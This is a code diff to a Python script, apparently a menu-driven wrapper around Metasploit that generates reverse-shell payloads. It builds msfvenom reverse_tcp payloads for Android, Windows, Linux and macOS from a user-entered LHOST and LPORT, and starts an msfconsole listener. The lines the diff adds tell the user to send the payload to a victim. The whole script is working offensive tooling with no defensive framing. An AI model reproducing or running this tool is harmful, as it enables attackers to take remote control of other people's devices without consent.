@@ -19,7 +19,8 @@ try:
 >> Payload generator for Metasploit <<""")
     def main():
         print(R+"""
-***************************************"""+Y+"""
+***************************************"""+CY+"""\n
+>>> Main menu"""+Y+"""
 
 1) Create a payload
 2) Start listner
@@ -60,37 +61,41 @@ Select option to create listner\n"""+B+"""
                 if ch==1:
                     lh=input(CY+"\nEnter LHOST:"+W+" ")
                     lp=int(input(CY+"Enter LPORT:"+W+" "))
-                    print("\nGernerting payload..........\n")
-                    st="msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload.apk"
+                    print(B+"\nGernerting payload..........\n")
+                    st="msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.apk"
                     os.system(st)
-                    print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.apk'+R+" <<<\n")
+                    print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.apk'+G+" in 'payload' folder"+R+" <<<\n")
+                    print(CY+"Now send this payload to victim. Then start 'Listner' from main menu\n")
                     osi()
                     sel1()
                 elif ch==2:
                     lh=input(CY+"\nEnter LHOST:"+W+" ")
                     lp=int(input(CY+"Enter LPORT:"+W+" "))
-                    print("\nGernerting payload..........\n")
-                    st="msfvenom -p windows/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload.exe"
+                    print(B+"\nGernerting payload..........\n")
+                    st="msfvenom -p windows/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.exe"
                     os.system(st)
-                    print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.exe'+R+" <<<\n")
+                    print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.exe'+G+" in 'payload' folder"+R+" <<<\n")
+                    print(CY+"Now send this payload to victim. Then start 'Listner' from main menu\n")
                     osi()
                     sel1()
                 elif ch==3:
                     lh=input(CY+"\nEnter LHOST:"+W+" ")
                     lp=int(input(CY+"Enter LPORT:"+W+" "))
-                    print("Gernerting payload..........")
-                    st="msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload.elf"
+                    print(B+"\nGernerting payload..........\n")
+                    st="msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.elf"
                     os.system(st)
-                    print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.elf'+R+" <<<\n")
+                    print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.elf'+G+" in 'payload' folder"+R+" <<<\n")
+                    print(CY+"Now send this payload to victim. Then start 'Listner' from main menu\n")
                     osi()
                     sel1()
                 elif ch==4:
                     lh=input(CY+"\nEnter LHOST:"+W+" ")
                     lp=int(input(CY+"Enter LPORT:"+W+" "))
-                    print("Gernerting payload..........")
-                    st="msfvenom -p osx/x86/shell_reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload.macho"
+                    print(B+"\nGernerting payload..........\n")
+                    st="msfvenom -p osx/x86/shell_reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/payload.macho"
                     os.system(st)
-                    print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.macho'+R+" <<<\n")
+                    print(R+"\n>>>"+G+" Payload saved as "+Y+'payload.macho'+G+" in 'payload' folder"+R+" <<<\n")
+                    print(CY+"Now send this payload to victim. Then start 'Listner' from main menu\n")
                     osi()
                     sel1()
                 elif ch==99:
@@ -109,7 +114,10 @@ Select option to create listner\n"""+B+"""
                 if ch==1:
                     pr=os.path.isfile("msh.rc")
                     if pr:
-                        os.remove('msh.rc')
+                        try:
+                            os.remove('msh.rc')
+                        except FileNotFoundError:
+                            print("")
                     else:                
                         lh=input(CY+"\nEnter LHOST:"+W+" ")
                         lp=int(input(CY+"Enter LPORT:"+W+" "))
@@ -123,8 +131,9 @@ Select option to create listner\n"""+B+"""
                         f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
                         f.close()
                     os.system('clear')
-                    print(Y+"Starting listner...............\n"+W)
+                    print(Y+"\nStarting listner...............\n"+W)
                     os.system("msfconsole -r msh.rc")
+                    os.remove('msh.rc')
                     os.system("clear")                      
                     lst()
                     sel2()
@@ -148,15 +157,19 @@ Select option to create listner\n"""+B+"""
                         f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
                         f.close()
                     os.system('clear')
-                    print(Y+"Starting listner...............\n"+W)
+                    print(Y+"\nStarting listner...............\n"+W)
                     os.system("msfconsole -r msh.rc")
+                    os.remove('msh.rc')
                     os.system('clear')
                     lst()
                     sel2()
                 elif ch==3:
                     pr=os.path.isfile('msh.rc')
                     if pr:
-                        os.remove('msh.rc')
+                        try:
+                            os.remove('msh.rc')
+                        except FileNotFoundError:
+                            print("")
                     else:                
                         lh=input(CY+"\nEnter LHOST:"+W+" ")
                         lp=int(input(CY+"Enter LPORT:"+W+" "))
@@ -170,15 +183,19 @@ Select option to create listner\n"""+B+"""
                         f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
                         f.close()
                     os.system('clear')
-                    print(Y+"Starting listner...............\n"+W)
+                    print(Y+"\nStarting listner...............\n"+W)
                     os.system("msfconsole -r msh.rc")
+                    os.remove('msh.rc')
                     os.system('clear')
                     lst()
                     sel2()
                 elif ch==4:
                     pr=os.path.isfile('msh.rc')
                     if pr:
-                        os.remove('msh.rc')
+                        try:
+                            os.remove('msh.rc')
+                        except FileNotFoundError:
+                            print("")
                     else:                
                         lh=input(CY+"\nEnter LHOST:"+W+" ")
                         lp=int(input(CY+"Enter LPORT:"+W+" "))
@@ -194,6 +211,7 @@ Select option to create listner\n"""+B+"""
                     os.system('clear')
                     print(Y+"\nStarting listner...............\n"+W)
                     os.system("msfconsole -r msh.rc")
+                    os.remove('msh.rc')
                     os.system('clear')
                     lst()
                     sel2()
@@ -215,7 +233,9 @@ Select option to create listner\n"""+B+"""
             main()
             sel()
         elif c==4:
-            print(Y+"\nExit.........! Have a nice day :) "+W)
+            print(Y+"\nExit.........! Have a nice day :) ")
+            print(R+"\n----------"+CY+" Code by:"+G+" Deadpool2000"+R+" ----------\n"+W)
+
         else:
             print(R+"\nInvalid choice ! Please try again :(\n")
             main()                
@@ -224,5 +244,5 @@ Select option to create listner\n"""+B+"""
     sel()
 except KeyboardInterrupt:
     print(CY+"""\n
-***************************************"""+R+
-"\n\nInterrupted!"+Y+" Exiting.........\n"+W)
+***************************************"""+G+
+"\n\n>>> "+R+"Interrupted!"+Y+" Exiting.........\n"+W)
